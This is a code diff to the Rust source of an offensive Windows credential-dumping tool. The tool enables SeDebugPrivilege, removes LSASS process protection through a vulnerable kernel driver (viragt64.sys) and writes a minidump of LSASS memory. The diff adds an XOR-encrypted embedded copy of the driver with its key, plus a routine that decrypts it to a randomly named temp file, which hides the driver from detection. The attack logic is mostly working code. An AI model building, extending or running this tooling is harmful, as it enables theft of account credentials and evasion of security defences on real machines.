@@ -15,6 +15,16 @@ mod syscall;
 use clap::{Parser, ValueEnum};
 use std::process;
 
+// ─── Embedded encrypted driver ────────────────────────────────────────────
+// To embed: python tools/encrypt_driver.py viragt64.sys
+// Then place viragt64.sys.enc in the project root and uncomment the next line:
+// const DRIVER_ENC: &[u8] = include_bytes!("../viragt64.sys.enc");
+const DRIVER_ENC: &[u8] = &[]; // Empty = use external file
+const DRIVER_XOR_KEY: &[u8] = &[
+    0x4D, 0x61, 0x6C, 0x77, 0x61, 0x72, 0x65, 0x44, 0x65, 0x76, 0x52, 0x75, 0x73, 0x74, 0x32, 0x30,
+    0x32, 0x36, 0x42, 0x59, 0x4F, 0x56, 0x44, 0x4B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x52, 0x57, 0x21,
+];
+
 #[derive(Clone, ValueEnum)]
 enum HandleMethod {
     /// Direct NtOpenProcess with PROCESS_VM_READ
@@ -101,23 +111,8 @@ fn main() {
     }
     println!("[+] SeDebugPrivilege enabled");
 
-    // Verify driver file exists
-    let driver_path = std::path::Path::new(&cli.driver);
-    if !driver_path.exists() {
-        eprintln!("[-] Driver file not found: {}", cli.driver);
-        process::exit(1);
-    }
-
-    // Get absolute path for driver
-    let driver_abs_path = std::fs::canonicalize(&cli.driver).unwrap_or_else(|e| {
-        eprintln!("[-] Failed to resolve driver path: {}", e);
-        process::exit(1);
-    });
-    let driver_abs_str = driver_abs_path.to_string_lossy().to_string();
-    let driver_abs_str = driver_abs_str
-        .strip_prefix("\\\\?\\")
-        .unwrap_or(&driver_abs_str)
-        .to_string();
+    // Resolve driver path — use embedded encrypted driver if available, else external file
+    let (driver_abs_str, _temp_path) = resolve_driver_path(&cli.driver);
 
     // Detect Windows version and get offsets
     let os_offsets = match offsets::detect_offsets() {
@@ -218,8 +213,13 @@ fn main() {
 
     // Step 5: Build minidump
     println!("[*] Step 5: Building minidump via NtReadVirtualMemory...");
-    let dump_result =
-        minidump::create_minidump(lsass_handle.handle(), lsass_pid, &cli.output, cli.encrypt);
+    let dump_result = minidump::create_minidump(
+        &api,
+        lsass_handle.handle(),
+        lsass_pid,
+        &cli.output,
+        cli.encrypt,
+    );
 
     // Step 6: Restore PPL
     if !cli.no_restore {
@@ -287,6 +287,54 @@ fn is_elevated(_api: &resolver::ApiResolver) -> bool {
         );
         let _ = CloseHandle(token);
         result.is_ok() && elevation.TokenIsElevated != 0
+    }
+}
+
+/// Resolve driver path: use embedded encrypted driver or external file
+fn resolve_driver_path(cli_driver: &str) -> (String, Option<std::path::PathBuf>) {
+    if !DRIVER_ENC.is_empty() {
+        // Decrypt embedded driver to a temp file
+        println!("[+] Using embedded encrypted driver");
+        let mut decrypted = DRIVER_ENC.to_vec();
+        for (i, byte) in decrypted.iter_mut().enumerate() {
+            *byte ^= DRIVER_XOR_KEY[i % DRIVER_XOR_KEY.len()];
+        }
+
+        // Write to temp directory with random-ish name
+        let seed = unsafe {
+            let mut s: u64;
+            std::arch::asm!("rdtsc", out("eax") s, out("edx") _);
+            s
+        };
+        let temp_name = format!("drv_{:08x}.sys", seed as u32);
+        let temp_dir = std::env::temp_dir();
+        let temp_path = temp_dir.join(&temp_name);
+
+        if let Err(e) = std::fs::write(&temp_path, &decrypted) {
+            eprintln!("[-] Failed to write decrypted driver: {}", e);
+            process::exit(1);
+        }
+
+        let abs = temp_path.to_string_lossy().to_string();
+        println!("[+] Decrypted driver to: {}", abs);
+        (abs, Some(temp_path))
+    } else {
+        // Use external driver file
+        let driver_path = std::path::Path::new(cli_driver);
+        if !driver_path.exists() {
+            eprintln!("[-] Driver file not found: {}", cli_driver);
+            eprintln!("    Hint: embed driver with `python tools/encrypt_driver.py viragt64.sys`");
+            process::exit(1);
+        }
+        let abs = std::fs::canonicalize(cli_driver)
+            .unwrap_or_else(|e| {
+                eprintln!("[-] Failed to resolve driver path: {}", e);
+                process::exit(1);
+            })
+            .to_string_lossy()
+            .to_string();
+        let abs = abs.strip_prefix("\\\\?\\").unwrap_or(&abs).to_string();
+        (abs, None)
     }
 }
 
